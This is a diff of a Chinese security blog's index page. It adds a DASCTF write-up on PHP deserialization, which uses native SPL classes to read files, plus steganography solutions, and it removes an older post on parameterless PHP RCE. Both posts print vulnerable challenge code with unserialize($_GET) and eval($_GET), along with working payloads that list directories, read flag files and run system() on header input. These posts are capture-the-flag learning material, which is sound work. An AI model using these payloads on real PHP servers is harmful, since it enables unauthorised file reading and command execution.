@@ -9,7 +9,93 @@
   },
   hexoVersion: '5.2.0'
 } </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Y. blog" type="application/atom+xml">
-</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://note.youdao.com/yws/api/personal/file/WEB4d4bfca5baf6c87d4aa15350aa33e8a7?method=download&amp;shareKey=fec53138a84367efadb03ddfa08bcb24"></div><div class="author-info__name text-center">YTsang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">16</span></a></div></div></div><nav id="nav" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Y. blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Y. blog</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/28/preg-replace-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">preg_replace()代码执行</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-28</time><div class="content"><h1 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace() 函数"></a>preg_replace() 函数</h1><p>先看一下php对preg_replace() 函数定义</p>
+</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://note.youdao.com/yws/api/personal/file/WEB4d4bfca5baf6c87d4aa15350aa33e8a7?method=download&amp;shareKey=fec53138a84367efadb03ddfa08bcb24"></div><div class="author-info__name text-center">YTsang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Y. blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Y. blog</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/29/DASCTF%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0writeup/">DASCTF三月赛复现writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-29</time><div class="content"><p>题目很好，我很菜，一道都没做出来，只能靠师傅们的writeup复现了。其他题等有环境再复现。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.plasf.cn/articles/dasctf202103.html">https://www.plasf.cn/articles/dasctf202103.html</a></p>
+</blockquote>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>这道题当时有思路，但是做不出来，看Gq师傅的writeup后才知道，学到了新知识。</p>
+<ul>
+<li><p>题目直接给源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">&quot;B&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;para = <span class="string">&quot;ctfer&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check = <span class="keyword">new</span> C;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;para) &amp;&amp; <span class="keyword">$this</span>-&gt;check-&gt;vaild(<span class="keyword">$this</span>-&gt;class)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;para);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;bad hacker~&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $a;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;hello &quot;</span>.<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params">$code</span>)</span>&#123;</span><br><span class="line">        $pattern = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (preg_match($pattern, $code))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>序列化反序列化的题，可以动态拼接类，Gq师傅用原生类读文件。</p>
+<blockquote>
+<p>官方文档<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p>
+</blockquote>
+<p>这里借用Gq师傅的表格</p>
+<table>
+<thead>
+<tr>
+<th>类</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DirectoryIterator</td>
+<td>遍历目录</td>
+</tr>
+<tr>
+<td>FilesystemIterator</td>
+<td>遍历目录</td>
+</tr>
+<tr>
+<td>GlobIterator</td>
+<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
+</tr>
+<tr>
+<td>SplFileObject</td>
+<td>读取文件，按行读取，多行需要遍历</td>
+</tr>
+<tr>
+<td>finfo/finfo_open()</td>
+<td>需要两个参数</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>用<code>FilesystemIterator</code>遍历/var/www/html，找到包含flag的文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">$o  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb8fb20554988460b12a9ec271a25d838?method=download&shareKey=7a740fd9726050a841fa2d2892a2537e"></p>
+</li>
+<li><p>再用<code>SplFileObject</code>读文件上诉文件夹，找到flag.php。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">$o = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB2ac6ee624f7924022d5810d5e458309f?method=download&shareKey=dc2f4c9cdbf177cfc99ed3daadcbb6c7"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB466f68270c72e85aaddfcddf82039808?method=download&shareKey=cc035a659dfc28b581cbdceadf84040f"></p>
+</li>
+</ul>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><ul>
+<li><p>关注公众号念词，识别正确就给flag，有一说一这普通话还真不容易。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB5d4ecefaa0f75b9ca9072be53bb07c13?method=download&shareKey=46387282b3ea12983e7337bf5f05424f"></p>
+</li>
+</ul>
+<h2 id="简单的png隐写"><a href="#简单的png隐写" class="headerlink" title="简单的png隐写"></a>简单的png隐写</h2><ul>
+<li><p>ctf一般不会没提示让爆破，猜测是伪加密，果不其然两个图。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc1f5c06c05ad11aef56195f856f70125?method=download&shareKey=d7982a2c5a9242a56fb2631079cf30fa"></p>
+</li>
+<li><p>题目是png隐写，那先从png这张图看，当时做的时候重心偏在jpg了，丢tweakpng里看一下，发现有两个IDAT块。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB26f9a56309501e92d76ee44f6bf81933?method=download&shareKey=a7da92173b9f62af4f4a80dd0987537b"></p>
+</li>
+<li><p>将上面四条删除，重新保存，出现一张提示，<code>89504E</code>是密码，用outguess解。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB3dfd4da378b26803461f29cae4beb2a3?method=download&shareKey=cd4230ab091b2f45e2c6f50e13012253"></p>
+</li>
+<li><p>用outguess解完是一串base64编码的字符串。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBf729302eaa9226eefa7368d8124e834d?method=download&shareKey=1d41e21e488ba2aac1f5a42676ee54dd"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBc39202ad7e539bfcc22e83ae6fe2afe1?method=download&shareKey=5a2dc253c344cfdcb97d742ec8bd6218"></p>
+</li>
+<li><p>解码后是一串十六进制数，再将十六进制数转换为字符串，发现有flag文件。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBbd04ef4167cd5425f5db4fb6c703f90b?method=download&shareKey=005121d5c948063df662ae362630f587"></p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe8f8971889c222a0dfa32db35613266c?method=download&shareKey=4c7b94bd274c60efdbdce6cb0f159815"></p>
+</li>
+<li><p>最后把这串十六进制数放进winhex。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB83adebdf25a5b869893c5ed876ae6c04?method=download&shareKey=a2a89b0410431e46e54d1d43abf2bee9"></p>
+</li>
+<li><p>用压缩包形式打开，得到flag。</p>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB55357095f9d77d539e886a6cc7917b18?method=download&shareKey=14ffa922f9e8a21d4948cfdf66a3a325"></p>
+</li>
+</ul>
+<h2 id="雾都孤儿"><a href="#雾都孤儿" class="headerlink" title="雾都孤儿"></a>雾都孤儿</h2><p>还在学习中，果然misc要学的东西又多又杂</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/28/preg-replace-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">preg_replace()代码执行</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-28</time><div class="content"><h1 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace() 函数"></a>preg_replace() 函数</h1><p>先看一下php对preg_replace() 函数定义</p>
 <blockquote>
 <p> preg_replace — 执行一个正则表达式的搜索和替换 </p>
 </blockquote>
@@ -618,74 +704,6 @@
 <blockquote>
 <p> <a target="_blank" rel="noopener" href="https://www.getflag.cn/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AF/">第三届海啸杯 | kawhi’s Blog (getflag.cn)</a><br> [第三届海啸杯 write up | (flag2020.top)](<a target="_blank" rel="noopener" href="https://flag2020.top/2020/11/19/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF">https://flag2020.top/2020/11/19/第三届海啸杯</a> write up/) </p>
 </blockquote>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/11/14/%E6%97%A0%E5%8F%82%E6%95%B0rce%E5%AD%A6%E4%B9%A0/">无参数rce学习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-11-14</time><div class="content"><h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><p>无参数rec，即在不使用参数的条件下，仅使用函数进行REC，简单点来说就是用函数无限套娃，而函数产生的信息就是我们要的参数。<br>一般题目中有这段代码基本就是无参数rec的题</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="无参数rce相关常用函数"><a href="#无参数rce相关常用函数" class="headerlink" title="无参数rce相关常用函数"></a>无参数rce相关常用函数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getchwd() 函数返回当前工作目录。</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir()   函数改变当前的目录。</span><br><span class="line">localeconv() 返回当地金融信息，其中包含了点</span><br><span class="line">readfile()   输出一个文件</span><br><span class="line">chr(pos(localtime())) 利用当前秒数构造点    </span><br><span class="line">current()    返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()      current() 的别名</span><br><span class="line">next()     函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()      将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()   函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机 键名的数组。 </span><br><span class="line">array_flip()   函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br><span class="line">chr()  函数从指定的 ASCII 值返回字符。</span><br><span class="line">hex2bin()  转换十六进制字符串为二进制字符串</span><br><span class="line">getenv()   获取一个环境变量的值(在7.1之后可以不给予参数)</span><br><span class="line">show_source() 高亮读取文件</span><br><span class="line">highlight_file() 高亮读取文件</span><br></pre></td></tr></table></figure>
-
-<h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><blockquote>
-<p>靶机地址：<a target="_blank" rel="noopener" href="http://47.98.234.232:28026/">http://47.98.234.232:28026</a></p>
-</blockquote>
-<ul>
-<li><p>首先先看一下题目源码,可以确定是无参数rce的题<br><img src="https://note.youdao.com/yws/api/personal/file/WEB190740577631b4552b688aafc6134207?method=download&shareKey=43f2dd47cdcef0763175d59cfaa32d12"></p>
-</li>
-<li><p>看一下这个正则匹配，这样就被匹配到了<br><img src="https://note.youdao.com/yws/api/personal/file/WEB7366994734dcefc5f95d341e8899a808?method=download&shareKey=0092142c205158ebed6a554affdc33ff"></p>
-</li>
-<li><p>那试一下在里面输入参数呢？这样就没被正则匹配到<br><img src="https://note.youdao.com/yws/api/personal/file/WEB1207e6faa2112776e8509fa940fa70bf?method=download&shareKey=cf9257729dc728e41ad7c2b409070ca4"></p>
-</li>
-<li><p>那在里面嵌套函数呢？这样就能被匹配，说明只能用函数嵌套来解决这道题<br><img src="https://note.youdao.com/yws/api/personal/file/WEBd8deeaa962e792a3f7a74cdd0a8bc8b4?method=download&shareKey=c73fd1f015face5103b1b4de802300e9"></p>
-</li>
-<li><p>那接下来就想办法用函数嵌套来获取flag<br>要获取flag就得先看目录，上面说到scandir()这个函数可以看目录，我们试一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php var_dump(scandir(&#39;.&#39;)); ?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe42689c9641963351c7d8ad5350f367b?method=download&shareKey=55b0a89990693627e995107871350373"></p>
-</li>
-</ul>
-<p>但这个函数有个问题，就是需要带个参数(‘.’),而通过上面知道不能出现这种参数，那接下来的问题就是怎么用函数构造点</p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>上面说到localeconv()这个函数包含了点，那用这个函数试一下。</p>
-<ul>
-<li><p>而点是这个函数的第一个元素，那么用current()、pos()都可以，这里用pos()试试,构造出点<br><img src="https://note.youdao.com/yws/api/personal/file/WEB2cc45007ee08d02df65a4f3cb03de3a9?method=download&shareKey=e5898ef841f2f9adf2b7400e1108ff24"></p>
-</li>
-<li><p>那把这几个函数嵌套试一下,成功读取目录<br><img src="https://note.youdao.com/yws/api/personal/file/WEB80a97b87588c18492cceedfd5293464a?method=download&shareKey=740e24a284c6589bfa8aaced1a1e869b"></p>
-</li>
-<li><p>传参进去，发现flag，而且是在最后<br><img src="https://note.youdao.com/yws/api/personal/file/WEBe54d30a1f12b509ec4ca385c916f0fb0?method=download&shareKey=aa9b0e6eba0468582c544b169b04c254"></p>
-</li>
-<li><p>用end()就可以读取最后一个<br><img src="https://note.youdao.com/yws/api/personal/file/WEB3dca95f74e5682095fefe33060589ff0?method=download&shareKey=3df69be5baba4045f0850404b2cfb32b"></p>
-</li>
-<li><p>再用readfile()查看文件，拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB405d647ad8258fa2552ebcddc76fbf39?method=download&shareKey=b74f1362b65419a3036941777de6ed28"></p>
-</li>
-</ul>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>除了上面这种方法构造点，还有另一种方法也可以构造点</p>
-<ul>
-<li>利用当前秒数构造点 ，利用localtime()中返回的秒数来构造点,在第46秒就是点<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(chr(pos(localtime())));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEBca3f892ce0292356dc59480c0dfe56b5?method=download&shareKey=0d335cb3a16be4bf83e5c9941eb2cb1e"></p>
-<ul>
-<li>跟方法一一样查看文件得到flag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(readfile(end(scandir(chr(pos(localtime()))))));</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p><img src="https://note.youdao.com/yws/api/personal/file/WEBe0d9f729ddd6ba740eb2f21d19cb3b08?method=download&shareKey=73c83ca7782216956016acb6cba5884b"></p>
-<p><strong>两个构造点法都能拿到flag,但相对来说第一种方便一点，第二种需要等46秒才能得到点，比较麻烦</strong></p>
-<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>也可以不用构造点来解决，可以利用SESSIONID来传参</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>如图用bp抓包，在cookie那里改成PHPSESSID=flag.php，同样拿到flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEB6a64f65d703aa7b62820c44144cba79c?method=download&shareKey=4c10b3394d772a9eb89bfcedfc2848b3"></li>
-</ul>
-<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><p>同样也可以利用getallheaders()来获取参数RCE</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(system(end(getallheaders())));</span><br></pre></td></tr></table></figure>
-<ul>
-<li>用bp抓包在最后请求头添加cat flag.php,读取flag<br><img src="https://note.youdao.com/yws/api/personal/file/WEBf5605ca479e6614f8950fbac4d4e044f?method=download&shareKey=5245c619863bb8692c810516593d4653"></li>
-</ul>
-<h1 id="跳转目录"><a href="#跳转目录" class="headerlink" title="跳转目录"></a>跳转目录</h1><ul>
-<li>当flag在上层目录时，需要跳转<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(implode(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))));</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p><strong>总的来说这类题就是用函数套娃来解决，但值得注意的是构造payload时括号不能少了！</strong></p>
 </div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://file.51ppt.vip/2020/2-8/192744-1521977264b903.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By YTsang</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
